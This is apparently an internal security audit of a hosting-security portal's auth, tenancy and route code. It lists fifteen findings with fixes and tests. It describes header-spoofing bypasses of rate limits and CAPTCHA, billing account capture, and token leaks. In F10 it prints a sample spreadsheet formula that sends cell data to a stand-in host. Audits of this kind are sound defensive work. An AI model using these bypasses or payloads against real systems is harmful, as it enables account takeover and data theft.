# A6: portal security (server/src auth, tenancy, routes)

## F1. Client IP is spoofable: every per-IP rate limit and audit IP can be bypassed
- Severity: HIGH
- Kind: security
- Confidence: HIGH
- Where: deploy/docker-compose.yml:32 (`TRUST_PROXY: "true"`), server/src/app.ts:295 (`trustProxy: cfg.trustProxy`), deploy/setup-almalinux.sh:362-385 (Apache/LiteSpeed `ProxyPass`); users of `req.ip`: routes/auth.ts:212 (login limit), routes/billing.ts:285 (set-password limit), routes/oauth.ts:102-106 (register/authorize/token limits), routes/blocks.ts:185-190 (unblock limit + per-day DB check), routes/agent.ts:63/85 (enroll limit, trial IPs), every `audit(... ip: req.ip)`
- Scenario: Fastify with `trustProxy: true` trusts every hop and takes the **left-most** `X-Forwarded-For` entry as `req.ip`. Apache/LiteSpeed `mod_proxy` appends the real client address to the XFF header the client sent, and does not replace it. An attacker who sends `X-Forwarded-For: <random>` on each request gets a new `req.ip` each time. As a result:
  - The login rate limit (10 per 5 minutes) no longer works, so passwords can be brute-forced at full speed.
  - The set-password limit is gone too.
  - `/oauth/register` can be called without limit, and `oauth_clients` keeps growing.
  - The `/api/unblock` limits are gone, both the 5-per-hour limit and the 5-per-day database check, so the `unblock_requests` table can be flooded.
  - Audit-log IPs are whatever the attacker chooses.
- Fix: Trust only the local proxy hop: `trustProxy: '127.0.0.1,::1'` (or the docker bridge range) instead of `true`. Make it the config default when `TRUST_PROXY` is set, for example `TRUST_PROXY=loopback`. Fastify then takes the right-most untrusted address, which is the one Apache appended. Regression test: inject a request with a forged XFF from 127.0.0.1 and check that `req.ip` is the last hop, not the forged one.

## F2. CAPTCHA address checks are bypassed with a forged `CF-Connecting-IP` (or XFF)
- Severity: HIGH
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/captcha.ts:222-226 (`visitorIP`), used at 396, 435, 450-540
- Scenario: With `trustProxy` on (the default deploy), `visitorIP` takes `CF-Connecting-IP` from any client, even when no Cloudflare sits in front. A bot operator who solves the page from one machine for many bot addresses can:
  - Send `CF-Connecting-IP: <bot address p.ip>`. `other` becomes false, so `strict_ip`, `allowOtherAddress` (3 others per hour), `sameNetwork`, the per-address ALTCHA quota and the `hostingAddress()` cloud refusal are all skipped. The `solver_ip` column stays empty, so the "solvers for other addresses" view never shows the abuse.
  - Rotate the header to reset the `/v`, `/v/verify` and `/v/altcha/challenge` rate limits, which are keyed on the same value.
  This undoes the 0.22.15-0.22.17 work against cloud solvers.
- Fix: Trust `CF-Connecting-IP` only when the TCP peer (after F1's fixed proxy chain) is in Cloudflare's published ranges, or behind a separate `CAPTCHA_BEHIND_CLOUDFLARE` option that is off by default. Otherwise use the fixed `req.ip`. Regression test: a POST to /v/verify with a forged header from a non-Cloudflare peer must still count as "another address".

## F3. Billing binds a purchase to any portal user with the same email, so a customer can capture another buyer's licence and servers
- Severity: HIGH
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/billing.ts:165-171 (`userByEmail`), 184-215 (provision), 231-237 (login-link); server/src/routes/users.ts:321-337 (owner creates users with any email); server/src/routes/auth.ts:255-278 (profile email change, no verification)
- Scenario:
  1. Customer A's owner creates a sub-user, or changes their own login, to `victim@example.com`, an address that has no portal account yet. Nothing verifies the address.
  2. The victim later buys on xpguard.org. `/api/billing/provision` finds that user, sees `platform=false`, and upserts the victim's licence (plan, max_servers, period) onto **A's account**.
  3. `/api/billing/login-link` then signs the victim in to A's account. Any server the victim installs from there enrols into A's account.
  4. A's owner and admins then hold `settings.set`, `finding.action delete`, `fw.*` and other actions on the victim's root agent.
- Fix:
  - Billing must match only an **owner** user of a **billing-created** account. Mark the account at provision time (for example `accounts.billing_ref` or `customer_ref`) and look it up by that, not by `users.email`.
  - Refuse provision or login-link when the email belongs to a non-owner or to an account without the billing marker (return 409).
  - Optionally block portal-side creation of users or email changes to an address the website already knows. Email verification is the long-term fix.
  - Regression test: create a sub-user with an email, call provision for that email, and expect 409 with no licence written.

## F4. MCP `ai_knowledge` (and `fleet_overview`) give customers the fleet-wide AI knowledge base
- Severity: MEDIUM
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/mcp.ts:304-327 (`ai_knowledge`), 151 (`fleet_overview` kb counts); compare routes/ai.ts:232 (`/api/ai/kb` is `requirePlatform`)
- Scenario: A customer owner or admin creates an MCP token. `tools/call ai_knowledge` with any `q` returns every `ai_kb` row: sha256, file base name, AI reason, matched signature, model and hits. The rows come from **all** accounts' servers. The REST equivalent is master-only, so this is a cross-tenant leak and master data is exposed. (`mark_file` already checks `isPlatform`, but the read tool does not.)
- Fix: In `ai_knowledge.run`, throw `ToolError` unless `isPlatform(ctx.accountId)`, and hide the tool from `tools/list` for customers. Drop the kb counts from `fleet_overview` for customers. Add a test that a customer token gets the error.

## F5. Long-lived secrets in URLs are written to the portal log
- Severity: MEDIUM
- Kind: leak
- Confidence: HIGH
- Where: server/src/app.ts:294 (default Fastify request logging at `info`); server/src/routes/mcp.ts:494 (`POST /mcp/:token`), 524 (URL handed out); server/src/routes/billing.ts:179, 264, 275 (`/sso?token=`, `/set-password?token=`, `/api/auth/set-password?token=`)
- Scenario: Fastify logs `incoming request` with `req.url` for every request. Each MCP call from a URL-token client therefore writes the `xgm_…` token to the docker or journal log. That token never expires and has write scope. Set-password tokens are also logged, and they stay valid for up to 7 days until used. Anyone who can read the logs (log shipping, support bundles) can take over the MCP access or set a customer's password.
- Fix: Add a `serializers.req` in `buildApp` that redacts the path segment after `/mcp/` and the `token` query parameter. Better still, set `disableRequestLogging` and log a redacted line. Test: log a request to `/mcp/xgm_x` and assert the token is not in the output.

## F6. Earlier set-password links stay valid after the password is set or changed
- Severity: MEDIUM
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/billing.ts:236 (each login-link mints another 7-day `set_password` token while the password is unset), 243, 246-255 (`consume` marks only the used token), 285-295; server/src/routes/auth.ts:280-295
- Scenario: The website calls login-link three times before the customer picks a password, which creates three 7-day set_password tokens. The customer uses one. The other two stay valid. Later the customer changes the password in the portal, and the old links still work. Anyone holding an old email, or the log lines from F5, can reset the password and gets a fresh session.
- Fix: When a password is set or changed (both handlers), run `DELETE FROM user_tokens WHERE user_id = $1`. In `userLink`, reuse the unexpired set_password token instead of minting another. Add a test that a second token fails after the first is used.

## F7. The master's Spamhaus DQS and Google Safe Browsing keys are pushed to every customer server
- Severity: MEDIUM
- Kind: leak
- Confidence: HIGH
- Where: server/src/routes/mail.ts:27-38 (`loadGlobalKeys` uses `masterAccount`, and `syncMail` sends it to any server); routes/mail.ts:96-100 and routes/domainrep.ts:298-302 (pushed to `scopeAccounts` = all accounts); agent/internal/mail/eximguard.go:160 (key written into the Exim RBL zone `<key>.zen.dq.spamhaus.net`)
- Scenario: The master saves the DQS key, and every customer server gets it through `mail.global`. The agent writes it into the server's Exim RBL configuration. A customer has root on their own server, so they read the master's paid DQS key from the Exim config or the agent's KV store. The Safe Browsing key leaks the same way. This breaks the rule that customers never see master secrets, and it uses up the master's Spamhaus licence.
- Fix: Send the master keys only to servers of the platform account (`isMaster(server.account_id)`). Customer servers get empty keys (or a per-customer key field), unless the master explicitly opts customer servers in, with the UI saying so. Test: `syncMail` for a customer server sends empty keys.

## F8. The one-trial-per-server check trusts addresses the installer reports
- Severity: MEDIUM
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/agent.ts:84-89, 104; server/src/routes/billing.ts:64-97
- Scenario: The trial host check uses `inv.primary_ip` and `inv.ips` from the enrolment body plus `req.ip`. A customer re-enrols the same server under a new trial account. They can send an inventory with private-only or empty IPs and a forged `X-Forwarded-For` (F1), or simply enrol from another host's network. `publicIPs()` then returns nothing new, `trialHostError` returns `''`, and the same server gets unlimited free trials.
- Fix: Record the proxy-verified source address (after F1) **always**, even when the inventory lists no IPs, and refuse a trial when that address is already in `trial_hosts`. Additionally key trials on a stable host fingerprint the agent reports (machine-id hash), refusing reuse. Test: enrolment with empty `ips` from an address already in `trial_hosts` returns 402.

## F9. No per-account protection against password guessing
- Severity: MEDIUM
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/auth.ts:212-228
- Scenario: The only control is 10 attempts per IP per 5 minutes, held in memory. A botnet, or one host using F1, can try passwords against the master owner's email without limit, because nothing counts failures per account. A master compromise gives root on every server in the fleet. `auth.login_failed` is audited but never acted on.
- Fix: Count recent `auth.login_failed` per lower(email). This can be done in SQL over `audit_events`, which already holds them. After, for example, 10 failures in 15 minutes, require a delay or temporary lock for that account (still answering 401 the same way, to avoid enumeration). Test: the 11th wrong attempt for one email from different IPs is refused.

## F10. CSV exports allow spreadsheet formula injection
- Severity: LOW
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/ai-learning.ts:42-45 (`csvCell`), server/src/routes/learning-export.ts:31-35 (`cell`)
- Scenario: The exported fields come from attackers: file paths and names on customer sites, matched malware code (`snippet`, `matched_code`), and WAF URIs and hosts. A file named `=HYPERLINK("http://x/?"&A1,"…").php`, or a request URI starting with `=`, `+`, `-` or `@`, is written raw. When the master opens the CSV in Excel or Sheets, the cell runs as a formula.
- Fix: In both cell functions, prefix values starting with `= + - @ \t \r` with `'` (OWASP CSV-injection rule). Share one helper. Test with an inert `=1+1` path.

## F11. Secrets sent with `settings.set` are stored in plaintext in the audit log and shown on /api/audit
- Severity: LOW
- Kind: leak
- Confidence: HIGH
- Where: server/src/routes/agent-cmd.ts:116-124, 169-176 (`summarize` keeps objects up to 300 chars); server/src/routes/mcp.ts:96-98, 545-552; server/src/routes/servers.ts:282-292; agent settings fields `smtp_password`, `telegram_token`, `secret_key`, `safe_browsing_key` (agent/internal/settings/settings.go:147, 441, 470, 472)
- Scenario: An admin saves notification settings. The audit row `agent.settings.set` stores `{notify:{smtp_password:"…", telegram_token:"…"}}` in plaintext, and every admin of the account can read it through `/api/audit`, although `settings.get` masks these fields. When the master edits a customer server, the customer's secrets end up in the master's audit log.
- Fix: In `summarize` / `trimParams`, recursively replace values of keys matching `/password|secret|token|_key$/i` with `"***"` before auditing. Test: audit detail of a settings.set containing smtp_password has no secret.

## F12. `PATCH /api/ai/providers/:id` uses a weaker guard and skips validation and audit
- Severity: LOW
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/ai.ts:121-143 (`requireRole('admin')`), compared with 106 (POST checks `^https?://`) and the other routes (`requirePlatform`)
- Scenario: AI keys are master settings, but PATCH lets any account's admin through. It is limited only by `account_id` in the WHERE clause, so a customer with legacy `ai_providers` rows (accounts created before migration 013) can still edit them. It also accepts any `base_url` scheme or host without the POST check, so the stored key is sent to that URL by `/test` and the gateway, and the change is not audited.
- Fix: Use `requirePlatform('admin')`, apply the same `base_url` validation as POST, and add `audit('ai.provider_update')`. Test: a customer admin gets 403.

## F13. Master access to customer servers is inconsistent between features
- Severity: LOW
- Kind: bug
- Confidence: HIGH
- Where: server/src/routes/notifications.ts:156-164 (`account_id = $1` only); server/src/routes/mcp.ts:77-87 (`resolveServer` own account only); compare tenancy.ts:156 `serverInScope` used by REST
- Scenario: The master opens a customer server's dashboard, which works through `serverInScope`. The header bell calls `/api/notifications?server=<id>`, but that route filters on the master's own `account_id`, so it returns nothing, including no "server is offline" alert. The master's MCP token likewise cannot reach customer servers that the REST UI can.
- Fix: For a single server, use `serverInScope`. For lists, use `scopeAccounts`, as `/api/fleet/health` already does. Do the same in MCP's `resolveServer` for platform tokens. Test: master + `?server=<customer id>` returns that server's alerts.

## F14. A password change keeps MCP and OAuth access alive, and OAuth access tokens never expire
- Severity: LOW
- Kind: security
- Confidence: HIGH
- Where: server/src/routes/auth.ts:288-291, billing.ts:290-291 (sessions deleted, tokens kept); server/src/routes/oauth.ts:219-226, 261-266 (no expiry, refresh token never rotated)
- Scenario: After a compromise the owner changes their password. Every `xgm_` token and OAuth grant the attacker created through the stolen session keeps working forever, with write scope on every server, until each one is found and revoked on the AI Connector page.
- Fix: When a user's password is changed or set, revoke that user's `mcp_tokens` (`created_by = user`) and `oauth_grants`, or at least list them and offer one-click revocation. Give OAuth access tokens an expiry (for example 24 h). Refresh already exists, so clients recover. Test: tokens are revoked after a password change.

## F15. A plan's server limit can be exceeded by enrolling two servers at the same moment
- Severity: LOW
- Kind: bug
- Confidence: MEDIUM
- Where: server/src/routes/agent.ts:72-82 (`serverLimitError(pool, …)` runs on the pool outside the transaction, and only the token row is locked); server/src/routes/servers.ts:214-234
- Scenario: An account with one free licence has two unused tokens. That happens when two `POST /api/enrollment-tokens` requests race, because each deletes "extra" tokens before inserting its own. Both servers then enrol at the same time. Each transaction sees `used < max_servers` and inserts, so the account ends up with max+1 servers.
- Fix: Inside the enrolment transaction, take `SELECT … FROM accounts WHERE id = $1 FOR UPDATE` (or `pg_advisory_xact_lock(hashtext(account_id))`) and run the limit check on the transaction client `c`.

## Area summary
- **Files read in full:** auth.ts, tenancy.ts, security.ts, app.ts, config.ts, db.ts, agent-sign.ts. Every route file in server/src/routes: auth, users, billing, oauth, mcp, agent-cmd, agent, servers, admin-servers, mass, fleet, blocks, trusted, notifications, mail, domainrep, ipdb, ai, ai-learning, learning-export, waf-intel, waf-rulesets, appearance, downloads, wpcore. For captcha.ts I read the guard, IP and config parts.
- **Also checked:** the relevant migrations and the deploy proxy and env setup.
- **Overall:** account scoping in the REST layer is consistent:
  - Master settings use `requirePlatform`.
  - Per-server actions go through `serverInScope` or `isMaster`.
  - Fleet lists use `scopeAccounts`.
  - The CSRF hook (JSON + Origin) and SameSite=Lax cookies are sound.
  - All SQL is parameterised. The only interpolated values are validated numbers (LIMIT/OFFSET) or fixed strings.
  - The billing HMAC uses a timestamp window and nonce replay protection, and is correct.
  - Secrets are masked in GET answers (AI keys, Turnstile secret, WAF feed keys, AbuseIPDB and DQS hints).
- **Riskiest spots:**
  1. The proxy trust settings (F1/F2). These make every IP-based control spoofable on the standard cPanel deploy, including the CAPTCHA protections against cloud solvers.
  2. Billing identity matched by email alone (F3).
  3. The MCP layer re-implementing scoping by hand and missing the platform check for the knowledge base (F4).
  4. Master secrets delivered to customer-controlled machines (F7).
